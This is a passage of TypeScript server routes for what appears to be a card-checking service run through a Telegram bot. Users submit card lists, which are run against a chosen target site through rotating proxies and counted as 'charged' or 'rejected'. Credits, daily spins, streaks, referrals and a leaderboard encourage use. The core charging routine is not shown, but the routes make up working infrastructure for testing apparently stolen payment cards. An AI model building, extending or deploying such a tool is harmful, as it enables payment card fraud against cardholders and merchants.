      let targetUrl = '';
      if (siteId) {
        const site = await storage.getSiteById(siteId);
        targetUrl = site?.url || '';
      }
      if (!targetUrl) {
        const activeSite = await storage.getActiveSite(req.user!.id);
        targetUrl = activeSite?.url || '';
      }

      // Get the user's saved proxies
      const userProxies = await storage.getUserProxies(req.user!.id);
      const proxyList = userProxies
        .filter(p => p.isValid !== false)
        .map(p => p.proxy)
        .join('\n');

      const sessionId = `session_${Date.now()}_${Math.random().toString(36).substring(7)}`;

      const session = await storage.createCheckSession({
        sessionId,
        userId: req.user!.id,
        siteId,
        totalCards: cardList?.length || 0,
      });

      // Clear old results so new check starts fresh
      await storage.clearResults(req.user!.id);

      processQueue(cardList || [], targetUrl, proxyList, req.user!.id, req.user!.telegramId, sessionId, siteId).catch(console.error);

      res.json(session);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post(api.check.stop.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      killUserProcesses(req.user!.id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post(api.check.clear.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      await storage.clearResults(req.user!.id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get('/api/check/status', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const job = getUserJob(req.user!.id);
      const results = await storage.getResults(100, req.user!.id);
      res.json({
        active: job.isRunning,
        processed: job.processed,
        total: job.total,
        charged: job.charged,
        rejected: job.rejected,
        results,
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get('/api/stats', authMiddleware, async (req: AuthRequest, res) => {
    const user = await storage.getUserByTelegramId(req.user!.telegramId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.json({
      totalCharged: user.totalCharged,
      totalRejected: user.totalRejected,
      credits: user.credits,
    });
  });

  app.get('/api/stats/global', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const globalStats = await storage.getGlobalStats();
      res.json(globalStats);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get(api.results.list.path, authMiddleware, async (req: AuthRequest, res) => {
    const results = await storage.getResults(100, req.user!.id);
    res.json(results);
  });

  app.delete(api.results.clear.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      await storage.clearResults(req.user!.id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  // Leaderboard
  app.get('/api/leaderboard', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const leaderboard = await storage.getLeaderboard(50);
      res.json(leaderboard);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  // Online users
  app.get('/api/online-users', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const online = await getOnlineUsers();
      res.json(online);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  // Notification settings
  app.get('/api/notifications/settings', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const settings = await storage.getNotificationSettings(req.user!.id);
      res.json(settings || {
        userId: req.user!.id,
        approvedAlerts: true,
        dailySummary: false,
        streakReminder: true,
        updatedAt: new Date(),
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/notifications/settings', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { approvedAlerts, dailySummary, streakReminder } = req.body;
      const settings = await storage.updateNotificationSettings(req.user!.id, {
        approvedAlerts,
        dailySummary,
        streakReminder,
      });
      res.json(settings);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  // Daily Spin
  app.get('/api/spin/status', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const canSpin = await storage.canSpinToday(req.user!.id);
      const lastSpin = await storage.getLastSpin(req.user!.id);
      res.json({ canSpin, lastSpin: lastSpin || null });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/spin', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const canSpin = await storage.canSpinToday(req.user!.id);
      if (!canSpin) {
        return res.status(400).json({ error: 'Already spun today' });
      }
      const prizes = [20, 30, 40, 60, 85, 110];
      const creditsWon = prizes[Math.floor(Math.random() * prizes.length)];
      const spin = await storage.recordSpin(req.user!.id, creditsWon);
      await storage.updateUserCredits(req.user!.telegramId, creditsWon);
      res.json(spin);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  // Daily Streak
  app.get('/api/streak/status', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const streak = await storage.getStreak(req.user!.id) as any;
      const now = new Date();
      const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
      let canClaim = true;
      if (streak?.lastClaimDate) {
        const last = new Date(streak.lastClaimDate);
        const lastDay = new Date(last.getFullYear(), last.getMonth(), last.getDate());
        canClaim = lastDay.getTime() !== today.getTime();
      }
      res.json({
        currentStreak: streak?.currentStreak || 0,
        longestStreak: streak?.longestStreak || 0,
        lastClaimDate: streak?.lastClaimDate,
        totalClaimed: streak?.totalClaimed || 0,
        canClaim,
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/streak/claim', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const result = await storage.claimStreak(req.user!.id);
      if (result.canClaim && result.reward > 0) {
        await storage.updateUserCredits(req.user!.telegramId, result.reward);
      }
      res.json({
        currentStreak: result.streak.currentStreak,
        longestStreak: result.streak.longestStreak,
        lastClaimDate: result.streak.lastClaimDate,
        totalClaimed: result.streak.totalClaimed,
        reward: result.reward,
        canClaim: result.canClaim,
      });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  // Referrals
  app.get('/api/referral/code', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const code = await storage.generateReferralCode(req.user!.id);
      res.json({ code });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get('/api/referral/stats', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const count = await storage.getReferralCount(req.user!.id);
      const referrals = await storage.getReferralsByUser(req.user!.id);
      res.json({ count, totalCredits: count * 100, referrals });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/referral/apply', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { code } = req.body;
      const refUser = await storage.getUserByReferralCode(code);
      if (!refUser) {
        return res.status(400).json({ error: 'Invalid referral code' });
      }
      if (refUser.id === req.user!.id) {
        return res.status(400).json({ error: 'You cannot use your own referral code' });
      }
      const current = await storage.getUserByTelegramId(req.user!.telegramId);
      if (current?.referredBy) {
        return res.status(400).json({ error: 'You already used a referral code' });
      }
      await storage.createReferral(refUser.id, current!.id, refUser.referralCode!);
      await storage.updateUser(req.user!.telegramId, { referredBy: refUser.id });
      await storage.updateUserCredits(req.user!.telegramId, 50);
      await storage.updateUserCredits(refUser.telegramId, 100);
      res.json({ creditsEarned: 50 });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  // Redeem Codes
  app.post('/api/redeem', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { code } = req.body;
      if (!code || typeof code !== 'string' || !code.trim()) {
        return res.status(400).json({ error: 'Please enter a code' });
      }
      const result = await storage.redeemCode(code.trim().toUpperCase(), req.user!.id, req.user!.telegramId);
      if (result.status === 'invalid') {
        return res.status(400).json({ error: 'Invalid code' });
      }
      if (result.status === 'used') {
        return res.status(400).json({ error: 'This code was already used' });
      }
      broadcastToTelegramId(req.user!.telegramId, {
        type: WS_EVENTS.CREDITS_UPDATE,
        payload: { credits: result.user.credits },
      });
      res.json({ code: result.code.code, credits: result.code.credits, balance: result.user.credits });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  // Telegram webhook - accepts both GET (for verification) and POST (for updates)
  app.get('/api/telegram/webhook', (req, res) => {
    console.log('[BOT] Webhook GET request received - verification from Telegram');
    res.json({ ok: true, status: 'webhook_ready' });
  });

  app.post('/api/telegram/webhook', async (req, res) => {
    try {
      const update = req.body;
      await handleBotUpdate(update);
      res.json({ ok: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
  });

  // Captcha endpoints
  app.get('/api/captcha', (req, res) => {
    try {
      const captcha = generateCaptcha();
      // Generate simple image by returning the numbers
      // The frontend will create a canvas-based image from these
      res.json({
        id: captcha.id,
        numbers: captcha.numbers
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post('/api/captcha/verify', (req, res) => {
    try {
      const { id, answer } = req.body;
      const isValid = verifyCaptcha(id, answer);
      res.json({ valid: isValid });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  initBot();

  return httpServer;
}

